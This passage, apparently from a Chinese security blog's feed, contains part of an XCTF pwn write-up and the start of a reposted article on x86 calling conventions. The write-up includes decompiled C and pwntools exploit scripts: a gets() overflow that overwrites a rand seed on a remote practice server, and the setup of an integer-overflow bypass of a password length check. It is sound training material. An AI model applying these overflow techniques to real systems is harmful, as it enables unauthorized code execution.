class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec guess_num </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/guess_num/guess_num&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><blockquote><p>几乎能开的保护全都开启了，所以这无疑增加了这道题目的难度</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *v3; <span class="comment">// rdi@1</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax@1</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// rdi@1</span></span><br><span class="line">  __int64 result; <span class="comment">// rax@7</span></span><br><span class="line">  __int64 v7; <span class="comment">// rsi@7</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [sp+4h] [bp-3Ch]@1</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [sp+8h] [bp-38h]@1</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [sp+Ch] [bp-34h]@1</span></span><br><span class="line">  <span class="keyword">char</span> v11; <span class="comment">// [sp+10h] [bp-30h]@1</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> seed[<span class="number">2</span>]; <span class="comment">// [sp+30h] [bp-10h]@1</span></span><br><span class="line">  __int64 v13; <span class="comment">// [sp+38h] [bp-8h]@1</span></span><br><span class="line"></span><br><span class="line">  v13 = *MK_FP(__FS__, <span class="number">40L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L);</span><br><span class="line">  v3 = <span class="built_in">stderr</span>;</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0L</span>L);</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  LODWORD(v4) = sub_BB0(v3, <span class="number">0L</span>L);</span><br><span class="line">  *(_QWORD *)seed = v4;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Welcome to a guess number game!"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"-------------------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please let me know your name!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your name:"</span>);</span><br><span class="line">  gets(&amp;v11);</span><br><span class="line">  v5 = (<span class="keyword">const</span> <span class="keyword">char</span> *)seed[<span class="number">0</span>];</span><br><span class="line">  srand(seed[<span class="number">0</span>]);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v10 = rand() % <span class="number">6</span> + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"-------------Turn:%d-------------\n"</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Please input your guess number:"</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">"%d"</span>, &amp;v8);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"---------------------------------"</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v8 != v10 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"GG!"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v5 = <span class="string">"Success!"</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_C3E(v5);</span><br><span class="line">  result = <span class="number">0L</span>L;</span><br><span class="line">  v7 = *MK_FP(__FS__, <span class="number">40L</span>L) ^ v13;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们采用逆推的思想，从上面的源代码可以看出，要想输出“Success”，就必须使得我们10次的输入与随机化产生的数值要想等，在之前还要输入一个name变量的字符串，可以看出gets()是一个危险函数，因为他不判断输入的长度，所以我们可以利用这一点。</p><p><br>再来看一下seed[2]的起始位置<code>bp-10h</code>，以及v11的位置<code>bp-30h</code>，所以说seed[0]的位置为<code>ebp-10h</code>，seed[1]的位置为<code>ebp-20h</code>，我们是不是可以通过gets函数，来改变seed[0]的值呢？答案是可以的，虽然开启了金丝雀和栈不可执行，但是这两个空间是一个连续空间，金丝雀并不会产生影响。</p><p><br>我们根据赋的值自己生成一下产生的10个（伪）随机数值，然后我们就可以获得flag</p></blockquote><h4 id="3解题步骤-5"><a class="markdownIt-Anchor" href="#3解题步骤-5"></a> <code>3.解题步骤</code></h4><blockquote><p>假如seed[0]被我们填充的为3时，产生的数值是什么？我们写了一个下面的脚本：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        srand(<span class="number">3</span>);</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i &lt;=<span class="number">9</span>;i++)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,rand()%<span class="number">6</span>+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>产生的数字为：<code>1</code>、<code>2</code>、<code>1</code>、<code>1</code>、<code>4</code>、<code>5</code>、<code>1</code>、<code>5</code>、<code>2</code>、<code>5</code>。那么下面我们可以写出我们的payload</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">"124.126.19.106"</span>,<span class="number">49881</span>)</span><br><span class="line">payload = <span class="number">0x20</span> * <span class="string">"a"</span> + str(p64(<span class="number">3</span>),encoding=<span class="string">"unicode_escape"</span>)</span><br><span class="line">r.recvline(<span class="string">"your name!"</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">num = <span class="string">"1211451525"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> num:</span><br><span class="line">    r.recvline(<span class="string">"guess number:"</span>)</span><br><span class="line">    r.sendline(i)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h4 id="5存在的问题-2"><a class="markdownIt-Anchor" href="#5存在的问题-2"></a> <code>5.存在的问题</code></h4><blockquote><p>网上用到了这样的exp</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">p = process(<span class="string">'./d22084e1938f4b21a380e38e2fb48629'</span>)</span><br><span class="line"><span class="comment"># p = remote("111.198.29.45", 39368)</span></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">0x20</span> + p64(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">p.sendlineafter(<span class="string">'Your name:'</span>, payload)</span><br><span class="line">libc.srand(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    num = str(libc.rand()%<span class="number">6</span> + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> num + <span class="string">'\n'</span></span><br><span class="line">    p.sendlineafter(<span class="string">'number:'</span>,num)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0x05-int_overflow"><a class="markdownIt-Anchor" href="#0x05-int_overflow"></a> <code>0x05 int_overflow</code></h3><h4 id="1相关知识点-6"><a class="markdownIt-Anchor" href="#1相关知识点-6"></a> <code>1.相关知识点</code></h4><blockquote><ol><li>数据类型大小：会产生溢出的情况</li></ol><p><img src="/images/122-5.png" alt></p></blockquote><h4 id="2解题思路-6"><a class="markdownIt-Anchor" href="#2解题思路-6"></a> <code>2.解题思路</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># file int_overflow </span><br><span class="line">int_overflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=aaef797b1ad6698f0c629966a879b42e92de3787, not stripped</span><br></pre></td></tr></table></figure><blockquote><p><code>int_overflow</code>文件是一个32位的ELF文件</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># checksec int_overflow </span><br><span class="line">[*] &apos;/root/Documents/CTF/PWN/XCTF/pwn/1/int_flow/int_overflow&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><blockquote><p>只开启了栈不可执行保护</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// [sp+Ch] [bp-Ch]@1</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"~~ Welcome to CTF! ~~"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       1.Login       "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"       2.Exit        "</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"---------------------"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your choice:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v4);</span><br><span class="line">  <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    login();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Bye~"</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Choice!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// login()函数</span></span><br><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">login</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+0h] [bp-228h]@1</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [sp+200h] [bp-28h]@1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your username:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x19</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Hello %s\n"</span>, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Please input your passwd:"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x199</span>u);</span><br><span class="line">  <span class="keyword">return</span> check_passwd(&amp;buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check_passwd(&amp;buf)函数</span></span><br><span class="line"><span class="keyword">char</span> *__<span class="function">cdecl <span class="title">check_passwd</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *result; <span class="comment">// eax@3</span></span><br><span class="line">  <span class="keyword">char</span> dest; <span class="comment">// [sp+4h] [bp-14h]@3</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v3; <span class="comment">// [sp+Fh] [bp-9h]@1</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">3u</span> || v3 &gt; <span class="number">8u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Invalid Password"</span>);</span><br><span class="line">    result = (<span class="keyword">char</span> *)fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Success"</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    result = <span class="built_in">strcpy</span>(&amp;dest, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>我们将上面的函数关系画一个简单的示意图，如下：</p></blockquote><p><img src="/images/122-7.png" alt></p><blockquote><p>现在对上面的源代码进行详细分析一下：该程序有两三处输入点：</p><ul><li>第一个是选择登录或者退出</li><li>第二个是输入我们的name</li><li>第三个是输入密码，而且passwd的最大输入长度为<code>0x199u</code>，并且在check_passwd检查passwd的长度，如果长度大于3小于等于8的话，输出“Success”，并且返回一个指向最终的目标字符串 dest 的指针<code>result</code>；否则输出“Invalid Password”，结束执行。而dest的位置为<code>ebp-14h</code>。这里还要注意一点就是v3是一个一字节长度的变量，前面对passwd进行长度限制时，最大长度为0x199，这很明显一个字节存储不下。那么会发生什么呢？整数溢出。</li></ul></blockquote><h4 id="3解题步骤-6"><a class="markdownIt-Anchor" href="#3解题步骤-6"></a> <code>3.解题步骤</code></h4><p>      首先先看一下怎么绕过<code>v3 &lt;= 3u || v3 &gt; 8u</code>，在这里v3是一个单字节变量，且是passwd的长度，而由于passwd最长可以输入<code>0x199</code>长度的字符串，所以我们先算好应该输入多长的passwd才能绕过if的判断语句：</p><blockquote><p>因为v3是单字节，也就是8个bit，正常来说v3为<code>0000 0100</code>到<code>0000 1000</code>区间都可以，也就是在[4,8]区间，如果v3的最高位产生了溢出，比如第9位为1，那么输入的长度应该在<code>1 0000 0100</code>到<code>1 0000 1000</code>，也就是[260,264]区间，在这里我们选择输入的长度为262</p></blockquote><p>      观察dest相对ebp的位置，从IDA中可以看出，dest位于<code>ebp-0x14</code>的位置，然后又因为存在一个<code>old ebp</code>，所以前面需要<code>0x14+4=0x18</code>字节的填充；</p><p>      我们又从IDA中可以找出<code>what_is_this</code>函数，该函数可以打印<code>flag.txt</code>，因为前面已经输入<code>0x14+4+4=0x1c</code>长度的字节，所以现在还剩<code>262-0x1c=234</code>长度的填充，示意图如下：</p><p><img src="/images/122-8.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-navy0x00-when_did_you_bornfont&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-navy0x00-when_did_you_bornfont&quot;&gt;&lt;/a&gt; &lt;font
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
      <category term="pwn" scheme="https://muzibing.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【转载】常见调用约定总结</title>
    <link href="https://muzibing.github.io/2020/05/31/2020.05.31%EF%BC%88121%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/05/31/2020.05.31（121）/</id>
    <published>2020-05-30T16:00:00.000Z</published>
    <updated>2020-05-31T15:27:05.848Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x00-常见的调用约定"><a href="#0x00-常见的调用约定" class="headerlink" title="0x00 常见的调用约定"></a><font color="navy">0x00 常见的调用约定</font></h3><h4 id="一、cdecl调用约定"><a href="#一、cdecl调用约定" class="headerlink" title="一、cdecl调用约定"></a><code>一、cdecl调用约定</code></h4><blockquote><p>又称C调用约定，是C/C++编译器默认的函数调用约定。所有非C++成员函数和未使用stdcall或fastcall声明的函数都默认是cdecl方式。<font color="navy"><strong>函数参数按照从右到左的顺序入栈</strong>，<strong>函数调用者负责清除栈中的参数</strong>，<strong>返回值在EAX中</strong>。</font>由于每次函数调用都要产生清除(还原)堆栈的代码，故使用cdecl方式编译的程序比使用stdcall方式编译的程序大(后者仅需在被调函数内产生一份清栈代码)。但cdecl调用方式支持可变参数函数(即函数带有可变数目的参数，如printf)，且调用时即使实参和形参数目不符也不会导致堆栈错误。对于C函数，cdecl方式的名字修饰约定是在函数名前添加一个下划线；对于C++函数，除非特别使用extern “C”，C++函数使用不同的名字修饰方式。</p></blockquote><h4 id="二、stdcall调用约定-微软命名"><a href="#二、stdcall调用约定-微软命名" class="headerlink" title="二、stdcall调用约定(微软命名)"></a><code>二、stdcall调用约定(微软命名)</code></h4><blockquote><p>Pascal程序缺省调用方式，WinAPI也多采用该调用约定。<font color="navy"><strong>stdcall调用约定主调函数参数从右向左入栈，除指针或引用类型参数外所有参数采用传值方式传递，由被调函数负责清除栈中的参数，返回值在EAX中</strong>。</font>stdcall调用约定仅适用于参数个数固定的函数，因为被调函数清栈时无法精确获知栈上有多少函数参数；而且如果调用时实参和形参数目不符会导致堆栈错误。对于C函数，stdcall名称修饰方式是在函数名字前添加下划线，在函数名字后添加@和函数参数的大小，如<code>_functionname@number</code></p></blockquote><h4 id="三、fastcall调用约定"><a href="#三、fastcall调用约定" class="headerlink" title="三、fastcall调用约定"></a><code>三、fastcall调用约定</code></h4><blockquote><p>stdcall调用约定的变形，<font color="navy"><strong>通常使用ECX和EDX寄存器传递前两个DWORD(四字节双字)类型或更少字节的函数参数，其余参数按照从右向左的顺序入栈，被调函数在返回前负责清除栈中的参数，返回值在 EAX 中。</strong></font>因为并不是所有的参数都有压栈操作，所以比stdcall和cdecl快些。编译器使用两个@修饰函数名字，后跟十进制数表示的函数参数列表大小(字节数)，如@function_name@number。需注意fastcall函数调用约定在不同编译器上可能有不同的实现，比如16位编译器和32位编译器。另外，在使用内嵌汇编代码时，还应注意不能和编译器使用的寄存器有冲突。</p></blockquote><h4 id="四、thiscall调用约定"><a href="#四、thiscall调用约定" class="headerlink" title="四、thiscall调用约定"></a><code>四、thiscall调用约定</code></h4><blockquote><p> C++类中的非静态函数必须接收一个指向主调对象的类指针(this指针)，并可能较频繁的使用该指针。主调函数的对象地址必须由调用者提供，并在调用对象非静态成员函数时将对象指针以参数形式传递给被调函数。编译器默认使用thiscall调用约定以高效传递和存储C++类的非静态成员函数的this指针参数。</p><p><br>thiscall调用约定函数参数按照从右向左的顺序入栈。若参数数目固定，则类实例的this指针通过ECX寄存器传递给被调函数，被调函数自身清理堆栈；若参数数目不定，则this指针在所有参数入栈后再入栈，主调函数清理堆栈。thiscall不是C++关键字，故不能使用thiscall声明函数，它只能由编译器使用。</p><p><br>注意，该调用约定特点随编译器不同而不同，g++中thiscall与cdecl基本相同，只是隐式地将this指针当作非静态成员函数的第1个参数，主调函数在调用返回后负责清理栈上参数；而在VC中，this指针存放在%ecx寄存器中，参数从右至左压栈，非静态成员函数负责清理栈上参数。</p></blockquote><h4 id="五、naked-call调用约定"><a href="#五、naked-call调用约定" class="headerlink" title="五、naked call调用约定"></a><code>五、naked call调用约定</code></h4><blockquote><p>对于使用naked call方式声明的函数，编译器不产生保存(prologue)和恢复(epilogue)寄存器的代码，且不能用return返回返回值(只能用内嵌汇编返回结果)，故称naked call。该调用约定用于一些特殊场合，如声明处于非C/C++上下文中的函数，并由程序员自行编写初始化和清栈的内嵌汇编指令。注意，naked call并非类型修饰符，故该调用约定必须与__declspec同时使用，如VC下定义求和函数：</p><p><br>代码示例如下(Windows采用Intel汇编语法，注释符为;)：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">__declspec(naked) <span class="keyword">int</span> __<span class="function">stdcall <span class="title">function</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    ;mov DestRegister, SrcImmediate(Intel) vs. movl $SrcImmediate, %DestRegister(AT&amp;T)</span><br><span class="line">    __asm mov eax, a</span><br><span class="line">    __asm add eax, b</span><br><span class="line">    __asm ret <span class="number">8</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意，__declspec是微软关键字，其他系统上可能没有。</p></blockquote><h4 id="六、pascal调用约定"><a href="#六、pascal调用约定" class="headerlink" title="六、pascal调用约定"></a><code>六、pascal调用约定</code></h4><blockquote><p>Pascal语言调用约定，参数按照从左至右的顺序入栈。Pascal语言只支持固定参数的函数，参数的类型和数量完全可知，故由被调函数自身清理堆栈。pascal调用约定输出的函数名称无任何修饰且全部大写。</p><p><br>Win3.X(16位)时支持真正的pascal调用约定；而Win9.X(32位)以后pascal约定由stdcall约定代替(以C约定压栈以Pascal约定清栈)。</p></blockquote><h3 id="0x01-调用约定的主要特点"><a href="#0x01-调用约定的主要特点" class="headerlink" title="0x01 调用约定的主要特点"></a><font color="navy">0x01 调用约定的主要特点</font></h3><p><img src="/images/121-1.jpg" alt></p><blockquote><p>Windows下可直接在函数声明前添加关键字<strong>stdcall、</strong>cdecl或<strong>fastcall等标识确定函数的调用方式，如int </strong>stdcall func()。Linux下可借用函数attribute 机制，如int <strong>attribute</strong>((<strong>stdcall</strong>)) func()。</p><p><br>代码示例如下：</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __attribute__((__cdecl__)) CalleeFunc(<span class="keyword">int</span> i, <span class="keyword">int</span> j, <span class="keyword">int</span> k)&#123;</span><br><span class="line"><span class="comment">// int __attribute__((__stdcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line"><span class="comment">//int __attribute__((__fastcall__)) CalleeFunc(int i, int j, int k)&#123;</span></span><br><span class="line">    <span class="keyword">return</span> i+j+k;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">CallerFunc</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CalleeFunc(<span class="number">0x11</span>, <span class="number">0x22</span>, <span class="number">0x33</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    CallerFunc();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p> 被调函数CalleeFunc分别声明为cdecl、stdcall和fastcall约定时，其汇编代码比较如下表所示：</p></blockquote><p><img src="/images/121-2.png" alt></p><h3 id="0x02-【扩展】可变参数函数支持条件"><a href="#0x02-【扩展】可变参数函数支持条件" class="headerlink" title="0x02 【扩展】可变参数函数支持条件"></a><font color="navy">0x02 【扩展】可变参数函数支持条件</font></h3><blockquote><font 